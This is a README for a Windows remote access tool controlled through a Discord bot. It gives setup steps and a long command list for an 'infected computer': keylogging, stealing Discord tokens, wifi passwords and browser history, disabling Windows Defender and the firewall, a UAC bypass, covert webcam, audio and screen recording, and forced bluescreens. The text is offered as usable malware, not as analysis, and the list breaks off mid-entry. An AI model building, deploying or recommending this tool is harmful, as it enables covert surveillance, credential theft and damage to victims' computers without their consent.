# Discord Remote Access Tool

A remote access tool controlled over Discord updated with over 60 post-exploitation modules.

## Setup
You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server).
Once the bot is created copy the token of your bot and paste it at line 20.

Install requirements :
```
pip3 install -r requirements.txt
```
If the steps above were successful, you can launch the python file by executing ```python RAT.py```. It will create a new channel and post a message on the server with a generated session number.
Now your bot should be available to use! 

Requirements:
Python3, Windows(x64)

## Modules
```
Available commands are :

!admincheck = Check if program has admin privileges

!audio = play an audio file on the target computer(.wav only) / Syntax = "!audio" (with attachment)

!blockinput = Blocks user's keyboard and mouse / Warning: Admin rights are required

!bluescreen = BlueScreen PC

!cd = Changes directory

!clipboard = Retrieve infected computer clipboard content

!critproc = make program a critical process. meaning if it's closed the computer will bluescreen (Admin rights are required)

!currentdir = display the current dir

!dateandtime = display system date and time

!delete = deletes a file / Syntax = "!delete /path/to/the/file.txt"

!disableantivirus = permanently disable windows defender (requires admin)

!disablefirewall = disable windows firewall (requires admin)

!displaydir = display all items in current dir

!displayoff = turn off the monitor (Admin rights are required)

!displayon = turn on the monitors (Admin rights are required)

!distaskmgr = disable task manager (Admin rights are required)

!download = Download a file from infected computer

!dumpkeylogger = Dumps the keylog

!ejectcd = eject the cd drive on the computer

!enbtaskmgr = enable task manager (if disabled) (Admin rights are required)

!exit = Exit program

!geolocate = Geolocate computer using latitude and longitude of the IP address with Google Maps / Warning: Geolocating IP addresses is not very precise

!getdiscordinfo = get discord token, email, phone number, etc

!getwifipass = get all the wifi passwords on the current device (Admin rights are required)

!hide = hide the file by changing the attribute to hidden

!history = Get chrome browser history

!idletime = Get the idle time of user's on target computer

!kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"

!logoff = log off current user

!message = Show a message box displaying your text / Syntax = "!message example"

!prockill = kill a process by name / syntax = "!kill process.exe"

!recam = record camera for a certain amount of time / syntax = "!reccam 10"

!recaudio = record audio for a certain amount of time / syntax = "!recaudio 10"

!recscreen = record screen for a certain amount of time / syntax = "!recscreen 10"

!restart = restart computer

!retractcd = retract the cd drive on the computer

!screenshot = Get the screenshot of the user's current screen

!selfdestruct = delete all traces that this program was on the target PC

!shell = Execute a shell command / Syntax = "!shell whoami"

!shutdown = shutdown computer

!startkeylogger = Starts a keylogger

!startup = add file to startup (when the computer goes on this file starts) (Admin rights are required)

!stopkeylogger = Stops keylogger

!stopscreen = stop screen stream

!stopwebcam = stop webcam stream

!streamscreen = stream screen by sending multiple pictures

!streamwebcam = streams webcam by sending multiple pictures

!sysinfo = Gives info about the infected computer

!uacbypass = attempt to bypass UAC to gain admin by using fod helper

!unblockinput = Unblocks user's keyboard and mouse / Warning: Admin rights are required

!uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening (Admin rights are required)

!unhide = unhide the file by removing the attribute to make it unhidden

!upload = Upload file to infected computer / Syntax = "!upload file.png" (with attachment)

!voice = Make a voice say out loud a custom sentence / Syntax = "!voice test"

!volumemax = Put volume to max

!volumezero = Put volume at 0

!wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)

!webcampic = Take a picture from the webcam

!website = open a website on the infected computer / syntax = "!website google.com" or "!website www.google.com"

!windowspass = attempt
```
